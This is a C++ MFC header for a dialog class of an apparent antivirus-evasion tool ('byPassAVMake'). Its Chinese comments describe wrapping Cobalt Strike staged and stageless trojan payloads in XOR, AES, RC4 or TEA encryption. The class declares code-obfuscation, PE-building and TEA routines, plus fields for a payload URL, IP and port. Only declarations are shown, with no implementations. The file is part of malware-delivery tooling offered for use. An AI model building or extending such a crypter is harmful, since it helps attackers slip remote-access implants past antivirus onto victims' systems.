
// byPassAVMakeDlg.h: 头文件
//

#pragma once
#include"MyListCtrl.h"
#include<list>
#include<stack>


/*****数据包封装
* |STu8		|STu8*			|STu32			|STu8*		|
* |加密类型	|密钥（16字节）	|加密数据长度	|加密数据	|
******/

//加密类型
#define H_ENC_XOR	STu8(0xB1)
#define H_ENC_AES	STu8(0xB2)
#define H_ENC_RC4	STu8(0xB3)
#define H_ENC_TEA	STu8(0xB4)

/*****加密数据封装
* |STu8		|STu32			|STu8*		|
* |数据类型	|数据长度		|payload数据|
******/

//payload数据类型
#define P_TYPE_STAGE		STu8(0xA0)
#define P_TYPE_STAGELESSURL	STu8(0xA1)

/*****stage payload
* Conbalt strike分离木马方式生成的阶段一木马
******/

/*****stageless url
* Conbalt strike分离木马方式生成的阶段二木马url
* 根据阶段一木马解析得来
******/

// CbyPassAVMakeDlg 对话框
class CbyPassAVMakeDlg : public CDialogEx
{
// 构造
public:
	CbyPassAVMakeDlg(CWnd* pParent = nullptr);	// 标准构造函数

// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_BYPASSAVMAKE_DIALOG };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);	// DDX/DDV 支持


// 实现
protected:
	HICON m_hIcon;

	// 生成的消息映射函数
	virtual BOOL OnInitDialog();
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	afx_msg void OnPaint();
	afx_msg HCURSOR OnQueryDragIcon();
	DECLARE_MESSAGE_MAP()
public:
	afx_msg void OnBnClickedButton1();
	afx_msg void OnBnClickedButton2();
	afx_msg void OnBnClickedButton3();
	afx_msg void OnBnClickedButton4();
	CEdit mSecName;
	CEdit mCodesLen;
	MyListCtrl mList;
	PEMake mPEMake;
	CEdit mFileBin;
	CEdit mDstFile;
	CEdit mStagelessURL;
	CEdit mStagelessIP;
public:
	void OnSaveAs();
	BOOL InitDisaDate(STu8*, STu32);
	void ConfusionCodes(STu8*, STu32, STu8**, STu32*);
	void Randomkey(unsigned char* key, unsigned int len);
	void encrypt_tea(unsigned long* in, unsigned long* key, unsigned long* out);
	void decrypt_tea(unsigned long* in, unsigned long* key, unsigned long* out);
	void tea_encrypt(unsigned char * v, unsigned int len,unsigned char * key,unsigned char ** out,unsigned int * outlen);
	void tea_decrypt(unsigned char* v, unsigned int len, unsigned char* key, unsigned char** out, unsigned int* outlen);
	afx_msg void OnBnClickedButton5();
	CEdit mPort;
	afx_msg void OnBnClickedButton6();
	afx_msg void OnBnClickedButton7();
	afx_msg void OnBnClickedButton8();
};



